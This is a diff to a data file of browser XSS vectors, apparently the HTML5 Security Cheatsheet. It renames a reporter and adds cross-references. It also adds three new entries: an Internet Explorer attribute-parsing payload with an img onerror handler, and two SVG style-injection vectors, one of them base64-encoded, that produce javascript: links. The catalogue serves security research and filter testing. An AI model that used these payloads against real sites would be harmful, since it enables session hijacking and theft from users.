@@ -1120,7 +1120,7 @@ var items =
             'safari': ['3.0', '4.0']
         },
         'tags'       : ['xss', 'javascript', 'comment', 'parsing', 'attributes'],
-        'reporter'   : 'sdc, .mario'
+        'reporter'   : 'sirdarckcat, .mario'
     },
     { /* ID 38 - HTML comment parsing issues (2)  */
         'id'         : 38,
@@ -1405,7 +1405,7 @@ var items =
             'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'internet explorer', 'css', 'quirks mode', 'proprietary', 'trick'],
-        'reporter'   : 'Gareth, LeverOne, sdc'
+        'reporter'   : 'Gareth, LeverOne, sirdarckcat'
     },
     { /* ID 47 - SVG file executing JavaScript via <SCRIPT> tag */
         'id'         : 47,
@@ -1753,7 +1753,7 @@ var items =
             'safari': ['3.0', '4.0', '5.0']
         },
         'tags'       : ['xss', 'javascript', 'nesting', 'script', 'parser', 'regex'],
-        'reporter'   : '.mario, Kyo, sdc'
+        'reporter'   : '.mario, Kyo, sirdarckcat'
     },
     { /* ID 58 - E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time */
         'id'         : 58,
@@ -1844,7 +1844,7 @@ var items =
             'safari' : ['4.x', '5.x']
         },
         'tags'       : ['trick', 'css', 'quirks mode', 'obfuscation', 'opera', 'firefox', 'internet explorer', 'chrome', 'safari', 'fuzzing'],
-        'reporter'   : 'Gareth, hasegawayosuke, LeverOne, .mario, RSnake, sdc'
+        'reporter'   : 'Gareth, hasegawayosuke, LeverOne, .mario, RSnake, sirdarckcat'
     },
     { /* ID 61 - CSS-encoding and backslashing */
         'id'         : 61,
@@ -1900,7 +1900,7 @@ var items =
             'ru' : 'Этот вектор симулирует использование в IE одиночной кавычки в качестве атрибута, чтобы обмануть фильтры.',
             'de' : ''
         },
-        'urls'    : ['#102'],
+        'urls'    : ['#102', '#108'],
         'howtofix'   : {
             'en' : '',
             'ja' : '',
@@ -2397,7 +2397,7 @@ var items =
             'required_mime' : '',
             'samedomain'    : '0',            
             'path'          : 'http://heideri.ch/jso/test.xdr',
-            'name'          : 'test.xdl',
+            'name'          : 'test.xdr',
             'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
         },
         'description': {
@@ -3042,7 +3042,7 @@ var items =
             'firefox': ['2.x', '3.x'] 
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml', 'css'],
-        'reporter'   : 'sdc'
+        'reporter'   : 'sirdarckcat'
     },
     { /* ID 99 - Using comments to obfuscate styles */
         'id'         : 99,
@@ -3156,7 +3156,7 @@ var items =
             'ru' : 'Internet Explorer рассматривает любой тег в качестве текстового содержимого в случае, если ограничители атрибута несбалансированы. В данном случае это достигается с помощью двух обратных апострофов вне формального атрибута, один из которых (добавлен с целью соблюдения чётности ограничителей) нейтрализован рядом стоящим символом, а другой выполняет функцию разбалансировки формального тега <IMG>. В результате этого тег <IMG> разбирается браузером как текст, а содержимое атрибута src, наоборот, как HTML.',
             'de' : ''
         },
-        'urls'    : ['#62'],
+        'urls'    : ['#62', '#108'],
         'howtofix'   : {
             'en' : '',
             'ja' : '',
@@ -3314,5 +3314,100 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'title', 'onpropertychange', 'internet explorer'],
         'reporter'   : '.mario'
+    },
+    { /* ID 108 - Internet Explorer parameter parsing issue */
+        'id'         : 108,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'Internet Explorer parameter parsing issue',
+            'ja' : '',
+            'ru' : 'Парсинг параметров в Internet Explorer',
+            'de' : ''
+        },
+        'data'       : '<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=%js_alert%></a>">',
+        'description': {
+            'en' : 'Internet Explorer treats the sequence of any quotes that follows the equal sign in a parameter without delimiters as the beginning of a new parameter.',
+            'ja' : '',
+            'ru' : 'Internet Explorer рассматривает последовательность из любой кавычки, следующей за знаком равенства, внутри параметра без явно указанных ограничителей как начало нового параметра.',
+            'de' : ''
+        },
+        'urls'    : ['#62','#102'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer' : ['6.0', '7.0', '8.0', '9.0']
+        },
+        'tags'       : ['xss', 'javascript', 'parameter', 'parsing', 'internet explorer'],
+        'reporter'   : 'Algol, sirdarckcat'
+    },
+    { /* ID 109 - SVG JavaScript execution via style injection (1) */
+        'id'         : 109,
+        'category'   : 'svg', 
+        'name'       : {
+            'en' : ' SVG JavaScript execution via style injection (1) ',
+            'ja' : '',
+            'ru' : 'Исполнение JavaScript в SVG c помощью стилевой инъекции (1)',
+            'de' : ''
+        },
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n\n</svg>',
+        'attachment' : {
+            'required_mime' : 'image/svg+xml',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test3.svg',
+            'name'          : 'test3.svg',
+            'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<clipPath id="a" >\n<set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" />\n</clipPath>\n\n<pattern id="b">\n<set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" />\n</pattern>\n\n<filter id="c">\n<set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" />\n</filter>\n\n<marker id="d">\n<set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(4)" />\n</marker>\n\n<mask id="e">\n<set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(5)" />\n</mask>\n\n<linearGradient id="f">\n<set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(6)" />\n</linearGradient>\n\n</svg>'
+        },
+        'description': {
+            'en' : 'SVG supports several new CSS properties (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), which can refer to external SVG-resources. These properties can also act as separate attributes. Within the external SVG can contain information to animate the current SVG-document. Example shows an animation links, but the possibilities of animation and other elements. Note that Opera does not show the user the change of links address, if the cursor does not go beyond it.',
+            'ja' : '',
+            'ru' : 'SVG поддерживает несколько новых CSS-свойств (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), которые могут ссылаться на внешние SVG-ресурсы. Эти свойства также могут выступать в качестве самостоятельных атрибутов. Внутри внешнего SVG может содержаться информация для анимирования действующего SVG-документа. Пример демонстрирует анимацию ссылки, но возможна также и анимация других элементов. Обратите внимание, что Opera не покажет изменение адреса ссылки, если курсор не выйдет за пределы её действия.',
+            'de' : ''
+        },
+        'urls'    : [''],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera' : ['10.x', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'svg', 'css', 'xml', 'style'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 110 - SVG JavaScript execution via style injection (2) */
+        'id'         : 110,
+        'category'   : 'svg', 
+        'name'       : {
+            'en' : ' SVG JavaScript execution via style injection (2) ',
+            'ja' : '',
+            'ru' : 'Исполнение JavaScript в SVG c помощью стилевой инъекции (2)',
+            'de' : ''
+        },
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n\n<path d="M0,0" marker-start="url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4NCjxtYXJrZXIgaWQ9ImEiICBtYXJrZXJXaWR0aD0iMTAwMCIgbWFya2VySGVpZ2h0PSIxMDAwIiByZWZYPSIwIiByZWZZPSIwIj4NCjxhIHhsaW5rOmhyZWY9Imh0dHA6Ly9nb29nbGUuY29tIj48c2V0IGF0dHJpYnV0ZU5hbWU9InhsaW5rOmhyZWYiIHRvPSJqYXZhc2NyaXB0OmFsZXJ0KDEpIiBiZWdpbj0iMXMiIC8+DQo8cmVjdCB3aWR0aD0iMTAwMCIgaGVpZ2h0PSIxMDAwIiBmaWxsPSJ3aGl0ZSIvPjwvYT4NCjwvbWFya2VyPg0KPC9zdmc+#a)"/>\n\n</svg>',
+        'description': {
+            'en' : 'This example shows how the property "marker" allows to insert into the current document is an external link with JavaScript: URL.',
+            'ja' : '',
+            'ru' : 'Показано, как свойство marker позволяет вставлять в текущий документ внешнюю ссылку с псевдоскриптом в качестве URL.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera' : ['10.x', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'svg', 'css', 'xml', 'style'],
+        'reporter'   : 'LeverOne'
     }
+
 ]
